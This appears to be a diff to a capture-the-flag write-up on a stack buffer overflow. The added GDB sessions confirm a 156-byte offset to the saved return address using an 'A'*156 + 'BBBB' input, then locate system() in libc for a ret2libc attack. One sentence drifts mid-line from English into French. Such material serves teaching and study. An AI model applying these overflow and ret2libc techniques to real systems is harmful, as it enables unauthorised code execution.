@@ -101,6 +101,45 @@ We convert `0x41326641` from hex to ASCII (remembering **little-endian** byte or
 
 So EIP contains the string `"Af2A"`. Looking at our pattern, `"Af2"` starts at position **156**. This means we need exactly **156 bytes of padding** before we reach EIP.
 
+### Step 3c: Confirm the offset with a targeted pattern in GDB
+
+We verify by sending exactly 156 bytes of padding followed by `BBBB`:
+
+```
+(gdb) set follow-fork-mode child
+(gdb) run <<< $(python -c 'print "A"*156 + "BBBB"')
+Give me some shellcode, k
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+```
+
+EIP = `0x42424242` (`BBBB`) — confirms the offset of **156 bytes**.
+
+We can aussi vérifier via `info frame` en posant un breakpoint avant le `gets` (dans le child) :
+
+```
+(gdb) set follow-fork-mode child
+(gdb) b *0x0804875e                          ← break at call gets (child path)
+(gdb) run
+Give me some shellcode, k
+
+Breakpoint 1, 0x0804875e in main ()
+
+(gdb) x/wx $esp                              ← first arg of gets = buffer address
+0xffffd680: 0xffffd6a0                        ← buffer starts at 0xffffd6a0
+
+(gdb) info frame
+Stack level 0, frame at 0xffffd740:
+ eip = 0x804875e in main; saved eip = 0xf7e45513
+ Saved registers:
+  ebx at 0xffffd730, edi at 0xffffd734,
+  ebp at 0xffffd738, eip at 0xffffd73c       ← saved EIP at 0xffffd73c
+
+(gdb) p/d 0xffffd73c - 0xffffd6a0
+$1 = 156                                     ← offset confirmed: 156 bytes
+```
+
 ---
 
 ## 4. Finding the addresses of `system()` and `"/bin/sh"`
@@ -109,7 +148,15 @@ For our ret2libc attack, we need two addresses:
 
 ### `system()` address
 
+We need to follow the child, set a breakpoint after `fork`, and query libc:
+
 ```
+(gdb) set follow-fork-mode child
+(gdb) b *0x0804874b                          ← after ptrace, before puts (child path)
+(gdb) run
+
+Breakpoint 1, 0x0804874b in main ()
+
 (gdb) p system
 $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
 ```
